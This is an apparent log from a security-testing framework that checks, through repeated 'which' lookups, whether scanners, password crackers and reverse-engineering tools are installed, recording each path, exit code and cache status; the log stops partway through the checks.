2025-10-24 06:15:12,305 - __main__ - INFO - 📤 STDOUT: /usr/bin/zaproxy
2025-10-24 06:15:12,308 - __main__ - INFO - 🧹 CLEANUP: Process 3158 removed from registry
2025-10-24 06:15:12,308 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,308 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,308 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,308 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,308 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which zaproxy
2025-10-24 06:15:12,308 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,308 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,308 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,308 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,308 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,308 - __main__ - INFO - 💾 Cached result for command: which zaproxy
2025-10-24 06:15:12,308 - __main__ - INFO - 🔍 Cache MISS for command: which katana
2025-10-24 06:15:12,308 - __main__ - INFO - 🚀 EXECUTING: which katana
2025-10-24 06:15:12,308 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,308 - __main__ - INFO - 🆔 PROCESS: PID 3163 started
2025-10-24 06:15:12,308 - __main__ - INFO - 🆔 REGISTERED: Process 3163 - which katana...
2025-10-24 06:15:12,309 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3163
2025-10-24 06:15:12,311 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/katana
2025-10-24 06:15:12,311 - __main__ - INFO - 🧹 CLEANUP: Process 3163 removed from registry
2025-10-24 06:15:12,311 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,311 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,311 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,311 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,311 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which katana
2025-10-24 06:15:12,311 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,311 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 06:15:12,312 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,312 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,312 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,312 - __main__ - INFO - 💾 Cached result for command: which katana
2025-10-24 06:15:12,312 - __main__ - INFO - 🔍 Cache MISS for command: which hakrawler
2025-10-24 06:15:12,312 - __main__ - INFO - 🚀 EXECUTING: which hakrawler
2025-10-24 06:15:12,312 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,313 - __main__ - INFO - 🆔 PROCESS: PID 3168 started
2025-10-24 06:15:12,313 - __main__ - INFO - 🆔 REGISTERED: Process 3168 - which hakrawler...
2025-10-24 06:15:12,314 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3168
2025-10-24 06:15:12,315 - __main__ - INFO - 📤 STDOUT: /usr/bin/hakrawler
2025-10-24 06:15:12,315 - __main__ - INFO - 🧹 CLEANUP: Process 3168 removed from registry
2025-10-24 06:15:12,315 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,315 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,315 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,315 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,315 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hakrawler
2025-10-24 06:15:12,315 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,315 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 06:15:12,315 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,315 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,315 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,315 - __main__ - INFO - 💾 Cached result for command: which hakrawler
2025-10-24 06:15:12,315 - __main__ - INFO - 🔍 Cache MISS for command: which nuclei
2025-10-24 06:15:12,315 - __main__ - INFO - 🚀 EXECUTING: which nuclei
2025-10-24 06:15:12,315 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,316 - __main__ - INFO - 🆔 PROCESS: PID 3173 started
2025-10-24 06:15:12,316 - __main__ - INFO - 🆔 REGISTERED: Process 3173 - which nuclei...
2025-10-24 06:15:12,316 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3173
2025-10-24 06:15:12,318 - __main__ - INFO - 📤 STDOUT: /usr/bin/nuclei
2025-10-24 06:15:12,320 - __main__ - INFO - 🧹 CLEANUP: Process 3173 removed from registry
2025-10-24 06:15:12,320 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,320 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,320 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,320 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,320 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which nuclei
2025-10-24 06:15:12,320 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,320 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,320 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,320 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,320 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,320 - __main__ - INFO - 💾 Cached result for command: which nuclei
2025-10-24 06:15:12,320 - __main__ - INFO - 🔍 Cache MISS for command: which wpscan
2025-10-24 06:15:12,320 - __main__ - INFO - 🚀 EXECUTING: which wpscan
2025-10-24 06:15:12,320 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,321 - __main__ - INFO - 🆔 PROCESS: PID 3178 started
2025-10-24 06:15:12,321 - __main__ - INFO - 🆔 REGISTERED: Process 3178 - which wpscan...
2025-10-24 06:15:12,321 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3178
2025-10-24 06:15:12,323 - __main__ - INFO - 📤 STDOUT: /usr/bin/wpscan
2025-10-24 06:15:12,327 - __main__ - INFO - 🧹 CLEANUP: Process 3178 removed from registry
2025-10-24 06:15:12,327 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,327 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,327 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,327 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,327 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which wpscan
2025-10-24 06:15:12,327 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,327 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,327 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,327 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,327 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,327 - __main__ - INFO - 💾 Cached result for command: which wpscan
2025-10-24 06:15:12,327 - __main__ - INFO - 🔍 Cache MISS for command: which graphql-scanner
2025-10-24 06:15:12,327 - __main__ - INFO - 🚀 EXECUTING: which graphql-scanner
2025-10-24 06:15:12,327 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,327 - __main__ - INFO - 🆔 PROCESS: PID 3183 started
2025-10-24 06:15:12,327 - __main__ - INFO - 🆔 REGISTERED: Process 3183 - which graphql-scanner...
2025-10-24 06:15:12,328 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3183
2025-10-24 06:15:12,334 - __main__ - INFO - 🧹 CLEANUP: Process 3183 removed from registry
2025-10-24 06:15:12,334 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,334 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,334 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,334 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,334 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which graphql-scanner
2025-10-24 06:15:12,334 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,334 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,334 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,334 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,334 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,334 - __main__ - INFO - 🔍 Cache MISS for command: which jwt-analyzer
2025-10-24 06:15:12,334 - __main__ - INFO - 🚀 EXECUTING: which jwt-analyzer
2025-10-24 06:15:12,334 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,335 - __main__ - INFO - 🆔 PROCESS: PID 3188 started
2025-10-24 06:15:12,335 - __main__ - INFO - 🆔 REGISTERED: Process 3188 - which jwt-analyzer...
2025-10-24 06:15:12,335 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3188
2025-10-24 06:15:12,342 - __main__ - INFO - 🧹 CLEANUP: Process 3188 removed from registry
2025-10-24 06:15:12,342 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 06:15:12,342 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,342 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 06:15:12,342 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,342 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which jwt-analyzer
2025-10-24 06:15:12,342 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,342 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:12,342 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:12,342 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:12,342 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,342 - __main__ - INFO - 🔍 Cache MISS for command: which medusa
2025-10-24 06:15:12,342 - __main__ - INFO - 🚀 EXECUTING: which medusa
2025-10-24 06:15:12,342 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,343 - __main__ - INFO - 🆔 PROCESS: PID 3193 started
2025-10-24 06:15:12,343 - __main__ - INFO - 🆔 REGISTERED: Process 3193 - which medusa...
2025-10-24 06:15:12,343 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3193
2025-10-24 06:15:12,346 - __main__ - INFO - 📤 STDOUT: /usr/bin/medusa
2025-10-24 06:15:12,348 - __main__ - INFO - 🧹 CLEANUP: Process 3193 removed from registry
2025-10-24 06:15:12,348 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,348 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,348 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,348 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,348 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which medusa
2025-10-24 06:15:12,348 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,348 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 06:15:12,348 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,348 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,348 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,348 - __main__ - INFO - 💾 Cached result for command: which medusa
2025-10-24 06:15:12,348 - __main__ - INFO - 🔍 Cache MISS for command: which patator
2025-10-24 06:15:12,348 - __main__ - INFO - 🚀 EXECUTING: which patator
2025-10-24 06:15:12,348 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,349 - __main__ - INFO - 🆔 PROCESS: PID 3198 started
2025-10-24 06:15:12,349 - __main__ - INFO - 🆔 REGISTERED: Process 3198 - which patator...
2025-10-24 06:15:12,349 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3198
2025-10-24 06:15:12,351 - __main__ - INFO - 📤 STDOUT: /usr/bin/patator
2025-10-24 06:15:12,354 - __main__ - INFO - 🧹 CLEANUP: Process 3198 removed from registry
2025-10-24 06:15:12,354 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,354 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,354 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,354 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,354 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which patator
2025-10-24 06:15:12,354 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,354 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,354 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,354 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,354 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,354 - __main__ - INFO - 💾 Cached result for command: which patator
2025-10-24 06:15:12,354 - __main__ - INFO - 🔍 Cache MISS for command: which hash-identifier
2025-10-24 06:15:12,354 - __main__ - INFO - 🚀 EXECUTING: which hash-identifier
2025-10-24 06:15:12,354 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,354 - __main__ - INFO - 🆔 PROCESS: PID 3203 started
2025-10-24 06:15:12,354 - __main__ - INFO - 🆔 REGISTERED: Process 3203 - which hash-identifier...
2025-10-24 06:15:12,355 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3203
2025-10-24 06:15:12,356 - __main__ - INFO - 📤 STDOUT: /usr/bin/hash-identifier
2025-10-24 06:15:12,358 - __main__ - INFO - 🧹 CLEANUP: Process 3203 removed from registry
2025-10-24 06:15:12,358 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,358 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,358 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,358 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,358 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which hash-identifier
2025-10-24 06:15:12,359 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,359 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 06:15:12,359 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,359 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,359 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,359 - __main__ - INFO - 💾 Cached result for command: which hash-identifier
2025-10-24 06:15:12,359 - __main__ - INFO - 🔍 Cache MISS for command: which ophcrack
2025-10-24 06:15:12,359 - __main__ - INFO - 🚀 EXECUTING: which ophcrack
2025-10-24 06:15:12,359 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,359 - __main__ - INFO - 🆔 PROCESS: PID 3208 started
2025-10-24 06:15:12,359 - __main__ - INFO - 🆔 REGISTERED: Process 3208 - which ophcrack...
2025-10-24 06:15:12,360 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3208
2025-10-24 06:15:12,361 - __main__ - INFO - 📤 STDOUT: /usr/bin/ophcrack
2025-10-24 06:15:12,364 - __main__ - INFO - 🧹 CLEANUP: Process 3208 removed from registry
2025-10-24 06:15:12,364 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,364 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,364 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,364 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,364 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which ophcrack
2025-10-24 06:15:12,364 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,364 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 06:15:12,364 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,364 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,364 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,364 - __main__ - INFO - 💾 Cached result for command: which ophcrack
2025-10-24 06:15:12,364 - __main__ - INFO - 🔍 Cache MISS for command: which gdb
2025-10-24 06:15:12,364 - __main__ - INFO - 🚀 EXECUTING: which gdb
2025-10-24 06:15:12,364 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,364 - __main__ - INFO - 🆔 PROCESS: PID 3213 started
2025-10-24 06:15:12,364 - __main__ - INFO - 🆔 REGISTERED: Process 3213 - which gdb...
2025-10-24 06:15:12,365 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3213
2025-10-24 06:15:12,367 - __main__ - INFO - 📤 STDOUT: /usr/bin/gdb
2025-10-24 06:15:12,369 - __main__ - INFO - 🧹 CLEANUP: Process 3213 removed from registry
2025-10-24 06:15:12,369 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,369 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,369 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,369 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,369 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which gdb
2025-10-24 06:15:12,369 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,369 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 13 bytes
2025-10-24 06:15:12,369 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,369 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,369 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,369 - __main__ - INFO - 💾 Cached result for command: which gdb
2025-10-24 06:15:12,369 - __main__ - INFO - 🔍 Cache MISS for command: which radare2
2025-10-24 06:15:12,369 - __main__ - INFO - 🚀 EXECUTING: which radare2
2025-10-24 06:15:12,369 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,370 - __main__ - INFO - 🆔 PROCESS: PID 3218 started
2025-10-24 06:15:12,370 - __main__ - INFO - 🆔 REGISTERED: Process 3218 - which radare2...
2025-10-24 06:15:12,371 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3218
2025-10-24 06:15:12,372 - __main__ - INFO - 📤 STDOUT: /usr/bin/radare2
2025-10-24 06:15:12,374 - __main__ - INFO - 🧹 CLEANUP: Process 3218 removed from registry
2025-10-24 06:15:12,374 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 06:15:12,374 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,374 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,374 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,374 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which radare2
2025-10-24 06:15:12,374 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:12,374 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,374 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,374 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,374 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,375 - __main__ - INFO - 💾 Cached result for command: which radare2
2025-10-24 06:15:12,375 - __main__ - INFO - 🔍 Cache MISS for command: which binwalk
2025-10-24 06:15:12,375 - __main__ - INFO - 🚀 EXECUTING: which binwalk
2025-10-24 06:15:12,375 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,375 - __main__ - INFO - 🆔 PROCESS: PID 3223 started
2025-10-24 06:15:12,375 - __main__ - INFO - 🆔 REGISTERED: Process 3223 - which binwalk...
2025-10-24 06:15:12,376 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 3223
2025-10-24 06:15:12,378 - __main__ - INFO - 📤 STDOUT: /usr/bin/binwalk
2025-10-24 06:15:12,381 - __main__ - INFO - 🧹 CLEANUP: Process 3223 removed from registry
2025-10-24 06:15:12,381 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 06:15:12,381 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 06:15:12,381 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 06:15:12,381 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 06:15:12,381 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which binwalk
2025-10-24 06:15:12,381 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 06:15:12,381 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 06:15:12,381 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 06:15:12,381 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 06:15:12,381 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:12,381 - __main__ - INFO - 💾 Cached result for command: which binwalk
2025-10-24 06:15:12,381 - __main__ - INFO - 🔍 Cache MISS for command: which ropgadget
2025-10-24 06:15:12,381 - __main__ - INFO - 🚀 EXECUTING: which ropgadget
2025-10-24 06:15:12,381 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 06:15:12,381 - __main__ - INFO - 🆔 PROCESS: PID 3228 started
2025-10-24 06:15:12,381 - __main__ - INFO - 🆔 REGISTERED: Process 3228 - which ropgadget...
